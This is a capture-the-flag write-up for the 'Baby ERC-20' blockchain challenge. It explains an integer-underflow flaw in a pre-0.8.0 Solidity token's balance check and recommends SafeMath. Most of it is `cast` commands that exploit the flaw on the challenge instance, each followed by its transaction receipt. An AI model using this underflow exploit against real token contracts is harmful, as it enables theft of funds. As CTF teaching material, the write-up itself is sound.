## Baby ERC-20

Author : shiro

Category : Blockchain

## Information

``` bash
cast call $setup "coin()(address)" -r $rpc
```

## Exploitation

- The intended solution in here, is because `require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");` is invalid. This code can lead to *Improper Validation* and *Integer Underflow*, for Solidity versions before 0.8.0, it’s a good idea to use the [SafeMath](https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol) library to handle such cases more safely. 

- This specific check might not always be accurate or sufficient because it could lead to unexpected behavior. For example, if `balances[msg.sender]` is **1** and `_value` is **2**, the result of `balances[msg.sender]` - `_value` would be **-1**, which is negative. However, instead of throwing an error, Solidity handles this by *underflowing*.

- In this case, the number wraps around to the maximum value that can be stored in the type, which for **uint256** is:

```
2^256 - 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935
```

- Thus, if `balances[msg.sender]` is **1** and you subtract **2**, the result will wrap around to the largest possible value for **uint256**, which is the number above.

- In this case, if an attacker sends greater amount than the balance, solidity will pass the checks because the result is non-negative value, so we can send greater amount than the balance.

```bash
cast send $coin "transfer(address,uint256)()" $setup 2 -r $rpc --private-key $pk
```

Output : 
```bash
blockHash               0xfe99af518aa33e6fc482489f6b1f2cf9bfcd8a709d2a47726098a9e831bb6fe0
blockNumber             2
contractAddress         
cumulativeGasUsed       51046
effectiveGasPrice       3000000000
from                    0xe40c61Ae2aca9567155764F49c860b848e332341
gasUsed                 51046
logs                    [{"address":"0x4aee34cadaf9a67b8732a70fd89b254fa7d503a3","topics":["0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef","0x000000000000000000000000e40c61ae2aca9567155764f49c860b848e332341","0x000000000000000000000000d0e6da23c807df939b5776c47941f966b9ac25d9"],"data":"0x0000000000000000000000000000000000000000000000000000000000000002","blockHash":"0xfe99af518aa33e6fc482489f6b1f2cf9bfcd8a709d2a47726098a9e831bb6fe0","blockNumber":"0x2","transactionHash":"0x7c586c2700dd2869d47c9db2d11cea0d252c61f19c577b3341d852a9826ca560","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000100000000000020000000000000000000000000000000000000000002000000000000000000000080000001000000100000000000002000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000100000000000
root                    0xba909e2d440e075d0ef5f36d7c9a699283ce1acde07cfd5e6e888e0ec31fc61d
status                  1
transactionHash         0x7c586c2700dd2869d47c9db2d11cea0d252c61f19c577b3341d852a9826ca560
transactionIndex        0
type                    2
to                      0x4aeE34caDAF9a67B8732a70fd89B254Fa7d503a3
blobGasPrice             "0x1"
```

- After transfering, we need to call `setPlayer()` and pass our wallet address from web launcher

```bash
cast send $setup "setPlayer(address)" $wallet -r $rpc --private-key $pk
```

Output : 
```bash
blockHash               0x56c1c2911628581bd1ed474b9e23c91eaf8f227252488694d99421224b1606d3
blockNumber             3
contractAddress         
cumulativeGasUsed       43870
effectiveGasPrice       3000000000
from                    0xe40c61Ae2aca9567155764F49c860b848e332341
gasUsed                 43870
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    0x9e909d55c7f597e10f325b2a4945594540796a7b54d8c87ac7754d72d2371350
status                  1
transactionHash         0x0195adbc8b3643c9f4bb79e2f249d0e6db54387a6ff42ba65fe731dda0086c25
transactionIndex        0
type                    2
to                      0xd0e6da23c807dF939B5776c47941f966b9aC25D9
blobGasPrice             "0x1"
```


```bash
cast call $setup "isSolved()(bool)" -r $rpc

true
```
